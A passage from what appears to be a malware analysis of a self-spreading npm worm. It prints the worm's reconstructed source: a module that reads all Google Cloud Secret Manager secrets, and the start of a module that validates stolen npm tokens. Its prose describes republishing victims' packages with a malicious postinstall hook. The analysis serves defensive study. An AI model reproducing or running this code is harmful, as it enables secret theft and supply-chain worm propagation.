</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">GCPModule</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">initialized</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="n">new</span> <span class="n">GoogleAuth</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="n">scopes</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;https://www.googleapis.com/auth/cloud-platform&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">secretsClient</span> <span class="o">=</span> <span class="n">new</span> <span class="n">SecretManagerServiceClient</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">initialize</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">initialized</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">projectId</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">getProjectId</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">client</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">auth</span><span class="o">.</span><span class="n">getClient</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">projectId</span> <span class="o">&amp;&amp;</span> <span class="n">client</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">let</span> <span class="n">email</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;email&#39;</span> <span class="ow">in</span> <span class="n">client</span> <span class="o">&amp;&amp;</span> <span class="nb">typeof</span> <span class="n">client</span><span class="o">.</span><span class="n">email</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">email</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">email</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">          <span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">projectId</span><span class="p">:</span> <span class="n">projectId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">email</span><span class="p">:</span> <span class="n">email</span>
</span></span><span class="line"><span class="cl">          <span class="p">};</span>
</span></span><span class="line"><span class="cl">          <span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="n">finally</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">this</span><span class="o">.</span><span class="n">initialized</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">isValid</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">initialized</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getProjectInfo</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">initialized</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getProjectId</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">projectInfo</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">getProjectInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">projectInfo</span><span class="err">?</span><span class="o">.</span><span class="n">projectId</span> <span class="o">||</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getUserEmail</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">projectInfo</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">getProjectInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">projectInfo</span><span class="err">?</span><span class="o">.</span><span class="n">email</span> <span class="o">||</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">listSecrets</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span> <span class="o">||</span> <span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="p">[</span><span class="n">secrets</span><span class="p">]</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">secretsClient</span><span class="o">.</span><span class="n">listSecrets</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="n">parent</span><span class="p">:</span> <span class="err">`</span><span class="n">projects</span><span class="o">/$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="o">.</span><span class="n">projectId</span><span class="p">}</span><span class="err">`</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">secrets</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">secret</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">nameParts</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">name</span><span class="err">?</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">secretId</span> <span class="o">=</span> <span class="n">nameParts</span><span class="p">[</span><span class="n">nameParts</span><span class="o">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">name</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">name</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">projectId</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="o">.</span><span class="n">projectId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">secretId</span><span class="p">:</span> <span class="n">secretId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">labels</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">labels</span> <span class="o">||</span> <span class="n">undefined</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getSecretValue</span><span class="p">(</span><span class="n">secretId</span><span class="p">,</span> <span class="n">version</span> <span class="o">=</span> <span class="s2">&#34;latest&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">isValidCredentials</span> <span class="o">||</span> <span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">secretName</span> <span class="o">=</span> <span class="err">`</span><span class="n">projects</span><span class="o">/$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">projectInfo</span><span class="o">.</span><span class="n">projectId</span><span class="p">}</span><span class="o">/</span><span class="n">secrets</span><span class="o">/$</span><span class="p">{</span><span class="n">secretId</span><span class="p">}</span><span class="o">/</span><span class="n">versions</span><span class="o">/$</span><span class="p">{</span><span class="n">version</span><span class="p">}</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="p">[</span><span class="n">response</span><span class="p">]</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">secretsClient</span><span class="o">.</span><span class="n">accessSecretVersion</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">:</span> <span class="n">secretName</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">payload</span><span class="err">?</span><span class="o">.</span><span class="n">data</span><span class="err">?</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">:</span> <span class="n">secretName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">secretId</span><span class="p">:</span> <span class="n">secretId</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">version</span><span class="p">:</span> <span class="n">response</span><span class="o">.</span><span class="n">name</span><span class="err">?</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span> <span class="o">||</span> <span class="n">version</span>
</span></span><span class="line"><span class="cl">      <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getAllSecretValues</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">secrets</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">listSecrets</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">allSecrets</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">secret</span> <span class="n">of</span> <span class="n">secrets</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">secretValue</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">getSecretValue</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">secretId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">secretValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">allSecrets</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">secretValue</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">allSecrets</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="n">GCPModule</span> <span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="npmmodule">NpmModule</h5>
<p>Finally, we reach the last and most crucial module for the worm&rsquo;s propagation behavior: the NpmModule. The module&rsquo;s main() calls the functions:</p>
<ul>
<li>validateToken(): Logs into the npm user account and returns the username.</li>
<li>getPackagesByMaintainer(): Retrieves all packages that the compromised user account maintains, along with other relevant package information.</li>
<li>updatePackage(): This malicious function is then called for each maintained package discovered.</li>
</ul>
<img src="/static/NPM/image-25.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-26.png" alt="drawing" width="1000"/>
<p>The updatePackage() function begins by checking if the tar utility is available on the operating system. It then proceeds to download the target package maintained by the user.</p>
<img src="/static/NPM/image-27.png" alt="drawing" width="1000"/>
<p>Then the package is extracted, and its version is incremented in the package.json file to prepare for publishing a new version.</p>
<img src="/static/NPM/image-28.png" alt="drawing" width="1000"/>
<p>Then A postinstall script is added to the package.json with the command &ldquo;node bundle.js&rdquo;, and the current script (bundle.js) is added to the package. The compromised package is then compressed and published to the npm registry using the npm publish command.</p>
<img src="/static/NPM/image-30.png" alt="drawing" width="1000"/>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">class</span> <span class="n">NpmModule</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">constructor</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">baseUrl</span> <span class="o">=</span> <span class="s2">&#34;https://registry.npmjs.org&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">userAgent</span> <span class="o">=</span> <span class="err">`</span><span class="n">npm</span><span class="o">/</span><span class="mf">9.2</span><span class="o">.</span><span class="mi">0</span> <span class="n">node</span><span class="o">/</span><span class="n">v</span><span class="o">$</span><span class="p">{</span><span class="n">process</span><span class="o">.</span><span class="n">version</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)}</span> <span class="n">workspaces</span><span class="o">/</span><span class="bp">false</span><span class="err">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">validateToken</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">)</span> <span class="k">return</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">response</span> <span class="o">=</span> <span class="n">await</span> <span class="n">fetch</span><span class="p">(</span><span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">baseUrl</span><span class="p">}</span><span class="o">/-/</span><span class="n">whoami</span><span class="err">`</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s2">&#34;GET&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">Authorization</span><span class="p">:</span> <span class="err">`</span><span class="n">Bearer</span> <span class="o">$</span><span class="p">{</span><span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">}</span><span class="err">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;Npm-Auth-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;web&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;Npm-Command&#34;</span><span class="p">:</span> <span class="s2">&#34;whoami&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">userAgent</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">Connection</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">Accept</span><span class="p">:</span> <span class="s2">&#34;*/*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">===</span> <span class="mi">401</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="s2">&#34;Invalid NPM token - authentication failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">response</span><span class="o">.</span><span class="n">ok</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">throw</span> <span class="n">new</span> <span class="n">Error</span><span class="p">(</span><span class="err">`</span><span class="n">NPM</span> <span class="n">whoami</span> <span class="n">failed</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">}</span> <span class="o">$</span><span class="p">{</span><span class="n">response</span><span class="o">.</span><span class="n">statusText</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
